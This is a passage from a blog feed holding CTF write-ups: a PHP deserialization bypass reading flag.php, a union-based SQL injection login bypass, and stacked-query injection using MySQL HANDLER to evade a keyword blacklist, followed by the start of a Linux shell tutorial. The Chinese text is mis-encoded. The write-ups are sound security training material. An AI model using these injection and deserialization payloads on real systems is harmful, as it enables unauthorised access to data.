punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"[Result]: &lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#è¿™ä¸ªæ˜¯å¼ºæ¯”è¾ƒ,å¯ä»¥ç»•è¿‡ï¼</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#è¿™é‡Œæ£€æŸ¥æ˜¯ä¸æ˜¯æœ‰ä¸ç¬¦åˆçš„ASCIIç å­—ç¬¦</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ€è·¯å¾ˆç®€å•é¦–å…ˆè®©<code>op = 2</code>ï¼Œè¿™æ ·å°±é€šè¿‡äº†å¼ºæ¯”è¾ƒå¹¶ä¸”ç»•è¿‡äº†å¼±æ¯”è¾ƒã€‚è¿™é‡Œæœ‰ä¸€ä¸ªä¸åŒçš„å°±æ˜¯å±æ€§éƒ½æ˜¯<code>protect</code>ï¼š</p><p>privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼•å…¥ä¸¤ä¸ª\x00ï¼Œæ³¨æ„è¿™ä¸¤ä¸ª\x00å°±æ˜¯asciiç ä¸º0çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³å¯¼è‡´æˆªæ–­ï¼Œä½†æ˜¯urlç¼–ç åå°±å¯ä»¥çœ‹å¾—å¾ˆæ¸…æ¥šäº†ã€‚åŒç†ï¼Œprotectedå±æ€§ä¼šå¼•å…¥\x00*\x00ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202080954986.png"></p><p>ä¸‹é¢æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ï¼Œç¬¬ä¸€ç§å°±æ˜¯ï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨<strong>å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²</strong>ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒ<strong>å°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤º</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span><span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$B</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$C</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'%00'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\\00'</span><span class="token punctuation">,</span> <span class="token variable">$B</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'S'</span><span class="token punctuation">,</span><span class="token variable">$C</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦ä¸€ç§å°±æ˜¯PHP7.1ä»¥ä¸Šç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥ç”¨publicå±æ€§æ¥ç»•è¿‡ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:12:"Hello World!";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ è¿›å»æŸ¥çœ‹æºç å°±å¾—åˆ°flagäº†ã€‚</p><h2 id="29-GXYCTF2019-BabySQli"><a href="#29-GXYCTF2019-BabySQli" class="headerlink" title="29.[GXYCTF2019]BabySQli"></a>29.[GXYCTF2019]BabySQli</h2><p>è¿™ä¸ªSQLæ³¨å…¥å’Œä¹‹å‰çš„ä¸å¤ªä¸€æ ·ï¼Œè€ƒå¯Ÿçš„æ˜¯è”åˆæ³¨å…¥ã€‚æºç åœ°å€ï¼š<a href="https://github.com/imagin-sch/GXY_CTF/tree/master/Web/BabySqli">https://github.com/imagin-sch/GXY_CTF/tree/master/Web/BabySqli</a></p><p>é¦–å…ˆè¯»å–æºç çœ‹åˆ°search.php,æ‰“å¼€çœ‹åˆ°ä¸€æ®µå­—ç¬¦ä¸²ï¼š<code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code>ï¼Œè¿™ä¸ªä¸æ˜¯base64å“¦ï¼Œè¿™ä¸ªæ˜¯base32ï¼Œè¿™é‡Œè®²ä¸€ä¸‹å¤§è‡´åŒºåˆ«ï¼š</p><ul><li>base32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—æ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚</li><li>base64 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ï¼Œå°å†™å­—æ¯ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚</li></ul><p>æ‰€ä»¥å…ˆbase32è§£å¯†ç„¶åbase64è§£å¯†ï¼Œå¾—åˆ°ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from user where username = '$name'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªç›´æ¥å‘Šè¯‰æˆ‘ä»¬æ˜¯ä»<code>user</code>è¡¨ä¸­è¯»å–ä¿¡æ¯ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®<code>username</code>çš„å­—æ®µå€¼ã€‚</p><p>å¼€å§‹å°è¯•æ³¨å…¥ï¼Œå‘ç°åªæœ‰usernameä¸ºadminæ—¶æ‰ä¸ä¼šæ˜¾ç¤ºwrong user ï¼Œè¯´æ˜åªèƒ½æ˜¯adminï¼Œä¸‹é¢å°±æ˜¯åˆ©ç”¨è”åˆæ³¨å…¥çš„ä¸€ä¸ªç‰¹ç‚¹ï¼š<font color="#FF5E3A" size="3">è”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</font>ã€‚</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from salaries;+--------+--------+------------+------------+| emp_no | salary | from_date  | to_date    |+--------+--------+------------+------------+|  10001 |   5000 | 1986-06-26 | 9999-01-01 ||  10002 |   5100 | 1996-08-03 | 9999-01-01 ||  10003 |   5200 | 1995-12-03 | 9999-01-01 ||  10004 |   5300 | 1986-12-01 | 9999-01-01 ||  10005 |   5400 | 1989-09-12 | 9999-01-01 ||  10006 |   5500 | 1990-08-05 | 9999-01-01 ||  10007 |   5600 | 1989-02-10 | 9999-01-01 ||  10008 |   5700 | 1998-03-11 | 2000-07-31 ||  10009 |   5800 | 1985-02-18 | 9999-01-01 ||  10010 |   5900 | 1996-11-24 | 2000-06-26 ||  10010 |   6000 | 2000-06-26 | 9999-01-01 ||  10011 |   6100 | 1990-01-22 | 1996-11-09 ||  10012 |   5000 | 1992-12-18 | 9999-01-01 ||  10013 |   5100 | 1985-10-20 | 9999-01-01 ||  10014 |   5200 | 1993-12-29 | 9999-01-01 ||  10015 |   5300 | 1992-09-19 | 1993-08-22 ||  10016 |   5400 | 1998-02-11 | 9999-01-01 ||  10017 |   5500 | 1993-08-03 | 9999-01-01 ||  10018 |   5700 | 1987-04-03 | 1992-07-29 ||  10018 |   5600 | 1992-07-29 | 9999-01-01 ||  10019 |   5800 | 1999-04-30 | 9999-01-01 ||  10020 |   5900 | 1997-12-30 | 9999-01-01 ||  10021 |   6000 | 1988-02-10 | 2002-07-15 ||  10022 |   6100 | 1999-09-03 | 9999-01-01 ||  10023 |   5000 | 1999-09-27 | 9999-01-01 ||  10024 |   5100 | 1998-06-14 | 9999-01-01 ||  10025 |   5200 | 1987-08-17 | 1997-10-15 ||  10026 |   5300 | 1995-03-20 | 9999-01-01 ||  10027 |   5400 | 1995-04-02 | 9999-01-01 ||  10028 |   5500 | 1991-10-22 | 1998-04-06 ||  10029 |   5600 | 1991-09-18 | 1999-07-08 ||  10029 |   5700 | 1999-07-08 | 9999-01-01 ||  10030 |   5800 | 1994-02-17 | 9999-01-01 |+--------+--------+------------+------------+33 rows in set (0.00 sec)mysql&gt; select * from salaries where emp_no=10001 union select 999,9999,2022-02-09,9999-01-01;+--------+--------+------------+------------+| emp_no | salary | from_date  | to_date    |+--------+--------+------------+------------+|  10001 |   5000 | 1986-06-26 | 9999-01-01 ||    999 |   9999 | 2011       | 9997       |+--------+--------+------------+------------+2 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è‡ªå·±æ„é€ çš„æ•°æ®å·²ç»æ˜¾ç¤ºå‡ºæ¥äº†ã€‚ä½†æ˜¯å†æ¬¡è¯»å–æ•°æ®çš„æ—¶å€™å°±æ²¡äº†ï¼Œåªæ˜¯<strong>æœ¬æ¬¡</strong>çš„ä¸´æ—¶è™šæ‹Ÿæ•°æ®ã€‚</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥æ„é€ æ‹¿flagäº†ï¼š</p><pre class="line-numbers language-none"><code class="language-none">name:1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#password:123#å…¶ä¸­202cb962ac59075b964b07152d234b70æ˜¯md5(123)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæœ‰ä¸ªç–‘é—®ä¸ºä»€ä¹ˆå¯ä»¥çŸ¥é“è¦md5åŠ å¯†ï¼Ÿï¼Ÿï¼Ÿ</p><h2 id="30-GYCTF2020-Blacklist"><a href="#30-GYCTF2020-Blacklist" class="headerlink" title="30.[GYCTF2020]Blacklist"></a>30.[GYCTF2020]Blacklist</h2><p>è¿™é“é¢˜å’Œå¼ºç½‘æ¯ä¹‹å‰çš„éšä¾¿æ³¨å‡ ä¹ä¸€æ ·ï¼Œä¸åŒçš„å°±æ˜¯æœ€åä¸€æ­¥ã€‚è€ƒå¯Ÿçš„æ˜¯<font color="#FF5E3A" size="3">è”åˆæ³¨å…¥</font>å’Œ<font color="#FF5E3A" size="3">Handlerå‘½ä»¤</font>ã€‚</p><p>å‰é¢çš„æ³¨å…¥å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 2#1';show tables;#1';show columns from FlagHere;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœä½ ç”¨åˆ°äº†selectï¼Œä¼šå‘ç°è¿‡æ»¤äº†ä»€ä¹ˆï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span><span class="token punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œå°±åˆ°äº†éš¾ç‚¹ï¼Œæˆ‘ä»¬ä¸èƒ½ç”¨selectï¼Œå±è”½äº†å¤§å°å†™ç»•è¿‡ç­‰ã€‚è¿™é‡Œå°±è€ƒå¯Ÿäº†åœ¨<font color="#FF5E3A" size="3">Mysqlä¸­</font>çš„ä¸€ä¸ªç­‰ä»·å‘½ä»¤<code>handler</code>ï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªçš„è¯­æ³•ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚HANDLER tbl_name OPEN [ [AS] alias] #é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]#é€šè¿‡HANDLER tbl_name READ index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }    [ WHERE where_condition ] [LIMIT ... ]#é€šè¿‡HANDLER tbl_name READ index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚HANDLER tbl_name READ { FIRST | NEXT }    [ WHERE where_condition ] [LIMIT ... ]#å…³é—­å¥æŸ„HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥å…·ä½“å±•ç¤ºä¸€ä¸‹ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; show tables from test;+----------------+| Tables_in_test |+----------------+| departments    || dept_emp       || dept_manager   || employees      || salaries       |+----------------+5 rows in set (0.00 sec)mysql&gt; handler salaries open;Query OK, 0 rows affected (0.00 sec)mysql&gt; handler salaries read first;+--------+--------+------------+------------+| emp_no | salary | from_date  | to_date    |+--------+--------+------------+------------+|  10001 |   5000 | 1986-06-26 | 9999-01-01 |+--------+--------+------------+------------+1 row in set (0.00 sec)mysql&gt; handler salaries close;Query OK, 0 rows affected (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±å¯ä»¥æ„é€ payloadå¾—åˆ°flagï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054294.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://huhu-myh.github.io/categories/CTF/"/>
    
    
    <category term="buuç»ƒä¹ " scheme="https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬äº”ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10011.html"/>
    <id>https://huhu-myh.github.io/posts/myh10011.html</id>
    <published>2022-01-25T11:40:34.000Z</published>
    <updated>2022-02-08T12:14:41.700Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="äº”ã€ç†è§£shell"><a href="#äº”ã€ç†è§£shell" class="headerlink" title="äº”ã€ç†è§£shell"></a>äº”ã€ç†è§£shell</h2><h3 id="5-1-shell-çš„ç±»å‹"><a href="#5-1-shell-çš„ç±»å‹" class="headerlink" title="5.1 shell çš„ç±»å‹"></a>5.1 shell çš„ç±»å‹</h3><p>ç³»ç»Ÿå¯åŠ¨ä»€ä¹ˆæ ·çš„shellç¨‹åºå–å†³äºä½ ä¸ªäººçš„ç”¨æˆ·IDé…ç½®ã€‚åœ¨<code>/etc/passwd</code>æ–‡ä»¶ä¸­ï¼Œåœ¨ç”¨æˆ·IDè®°å½•çš„ç¬¬7ä¸ªå­—æ®µä¸­åˆ—å‡ºäº†é»˜è®¤çš„shellç¨‹åºã€‚åªè¦ç”¨æˆ·ç™»å½•åˆ°æŸä¸ªè™šæ‹Ÿæ§åˆ¶å°ç»ˆç«¯æˆ–æ˜¯åœ¨GUIä¸­å¯åŠ¨ç»ˆç«¯ä»¿çœŸå™¨ï¼Œ<strong>é»˜è®¤çš„shellç¨‹åºå°±ä¼šå¼€å§‹è¿è¡Œ</strong>ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwdlighthouse:x:1000:1000::/home/lighthouse:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>bash shellç¨‹åºä½äº/binç›®å½•å†…ã€‚ä»é•¿åˆ—è¡¨ä¸­å¯ä»¥çœ‹å‡º<code>/bin/bash</code>ï¼ˆ bash shellï¼‰æ˜¯ä¸€ä¸ª<strong>å¯æ‰§è¡Œç¨‹åº</strong>ï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -lF /bin/bash</span>-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">1168776</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> /bin/bash*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>é»˜è®¤çš„äº¤äº’shell</strong>ä¼šåœ¨ç”¨æˆ·ç™»å½•æŸä¸ªè™šæ‹Ÿæ§åˆ¶å°ç»ˆç«¯æˆ–åœ¨GUIä¸­è¿è¡Œç»ˆç«¯ä»¿çœŸå™¨æ—¶å¯åŠ¨ã€‚ä¸è¿‡è¿˜æœ‰å¦å¤–ä¸€ä¸ªé»˜è®¤shellæ˜¯<code>/bin/sh</code>ï¼Œå®ƒä½œä¸ºé»˜è®¤çš„<strong>ç³»ç»Ÿshell</strong>ï¼Œç”¨äºé‚£äº›éœ€è¦åœ¨å¯åŠ¨æ—¶ä½¿ç”¨çš„ç³»ç»Ÿshellè„šæœ¬ã€‚  </p><p>ç»å¸¸ä¼šçœ‹åˆ°æŸäº›å‘è¡Œç‰ˆä½¿ç”¨<strong>è½¯é“¾</strong>æ¥å°†é»˜è®¤çš„ç³»ç»Ÿshellè®¾ç½®æˆbash shellï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -lF /bin/sh</span>lrwxrwxrwx <span class="token number">1</span> root root <span class="token number">4</span> Nov <span class="token number">25</span> <span class="token number">15</span>:30 /bin/sh -<span class="token operator">&gt;</span> bash*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ‰äº›å‘è¡Œç‰ˆä¸Šï¼Œé»˜è®¤çš„ç³»ç»Ÿshellå’Œé»˜è®¤çš„äº¤äº’shellå¹¶ä¸ç›¸åŒï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwd<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>christine:x:1000:1000:Christine,,,:/home/christine:/bin/bash$$ <span class="token function">ls</span> -l /bin/shlrwxrwxrwx <span class="token number">1</span> root root <span class="token number">4</span> Apr <span class="token number">22</span> <span class="token number">12</span>:33 /bin/sh -<span class="token operator">&gt;</span> dash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-shell-çš„çˆ¶å­å…³ç³»"><a href="#5-2-shell-çš„çˆ¶å­å…³ç³»" class="headerlink" title="5.2 shell çš„çˆ¶å­å…³ç³»"></a>5.2 shell çš„çˆ¶å­å…³ç³»</h3><p>ç”¨äºç™»å½•æŸä¸ªè™šæ‹Ÿæ§åˆ¶å™¨ç»ˆç«¯æˆ–åœ¨GUIä¸­è¿è¡Œç»ˆç«¯ä»¿çœŸå™¨æ—¶æ‰€å¯åŠ¨çš„é»˜è®¤çš„äº¤äº’shellï¼Œæ˜¯ä¸€ä¸ª<strong>çˆ¶shell</strong>ã€‚  åœ¨CLIæç¤ºç¬¦åè¾“å…¥<code>/bin/bash</code>å‘½ä»¤æˆ–å…¶ä»–ç­‰æ•ˆçš„<code>bash</code>å‘½ä»¤æ—¶ï¼Œ ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„shellç¨‹åºã€‚è¿™ä¸ªshellç¨‹åºè¢«ç§°ä¸º<strong>å­shellï¼ˆ child shellï¼‰</strong>ã€‚å­shellä¹Ÿæ‹¥æœ‰CLIæç¤ºç¬¦ï¼ŒåŒæ ·ä¼šç­‰å¾…å‘½ä»¤è¾“å…¥ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot      <span class="token number">8068</span>  <span class="token number">8050</span>  <span class="token number">0</span> <span class="token number">19</span>:48 pts/0    00:00:00 -bashroot     <span class="token number">12611</span>  <span class="token number">8068</span>  <span class="token number">0</span> <span class="token number">20</span>:06 pts/0    00:00:00 <span class="token function">ps</span> -froot@VM-16-11-debian:~<span class="token comment"># bash  